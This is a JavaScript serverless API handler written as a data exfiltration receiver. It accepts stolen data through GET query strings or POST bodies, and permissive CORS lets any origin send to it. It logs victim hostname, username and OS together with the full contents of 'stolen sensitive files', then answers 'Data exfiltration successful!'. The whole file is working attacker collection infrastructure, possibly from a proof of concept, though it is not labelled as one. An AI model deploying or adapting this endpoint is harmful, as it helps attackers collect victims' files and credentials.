export default function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method === 'GET') {
    // Handle GET request with data in query parameters
    const { data } = req.query;
    
    if (!data) {
      return res.status(200).json({ 
        message: 'Data exfiltration receiver ready',
        instructions: 'Send data via GET /api/exfiltrate?data=<encoded_json> or POST with JSON body'
      });
    }

    try {
      const exfiltrationData = JSON.parse(decodeURIComponent(data));
      
      // Log the exfiltrated data
      console.log('🔥 DATA EXFILTRATION DETECTED! 🔥');
      console.log('Time:', new Date().toISOString());
      console.log('Session ID:', exfiltrationData.session_id);
      console.log('Timestamp:', exfiltrationData.timestamp);
      
      if (exfiltrationData.metadata) {
        console.log('Victim Info:');
        console.log('  Hostname:', exfiltrationData.metadata.hostname);
        console.log('  User:', exfiltrationData.metadata.user);
        console.log('  OS:', exfiltrationData.metadata.os);
      }
      
      console.log('📁 STOLEN SENSITIVE FILES:');
      console.log('='.repeat(50));
      
      if (exfiltrationData.files) {
        Object.entries(exfiltrationData.files).forEach(([filePath, content]) => {
          console.log(`📄 File: ${filePath}`);
          console.log('Content:');
          console.log(content);
          console.log('-'.repeat(30));
        });
      }
      
      // Return the data in a readable format
      res.status(200).json({
        success: true,
        message: 'Data exfiltration successful!',
        timestamp: new Date().toISOString(),
        exfiltrated_data: exfiltrationData
      });
      
    } catch (error) {
      console.error('Error processing exfiltration data:', error);
      res.status(400).json({ error: 'Invalid data format' });
    }
  } else if (req.method === 'POST') {
    // Handle POST request with JSON body
    try {
      const exfiltrationData = req.body;
      
      // Log the exfiltrated data
      console.log('🔥 DATA EXFILTRATION DETECTED! 🔥');
      console.log('Time:', new Date().toISOString());
      console.log('Session ID:', exfiltrationData.session_id);
      console.log('Timestamp:', exfiltrationData.timestamp);
      
      if (exfiltrationData.metadata) {
        console.log('Victim Info:');
        console.log('  Hostname:', exfiltrationData.metadata.hostname);
        console.log('  User:', exfiltrationData.metadata.user);
        console.log('  OS:', exfiltrationData.metadata.os);
      }
      
      console.log('📁 STOLEN SENSITIVE FILES:');
      console.log('='.repeat(50));
      
      if (exfiltrationData.files) {
        Object.entries(exfiltrationData.files).forEach(([filePath, content]) => {
          console.log(`📄 File: ${filePath}`);
          console.log('Content:');
          console.log(content);
          console.log('-'.repeat(30));
        });
      }
      
      res.status(200).json({ 
        success: true, 
        message: 'Data received successfully',
        timestamp: new Date().toISOString()
      });
      
    } catch (error) {
      console.error('Error processing exfiltration data:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
} 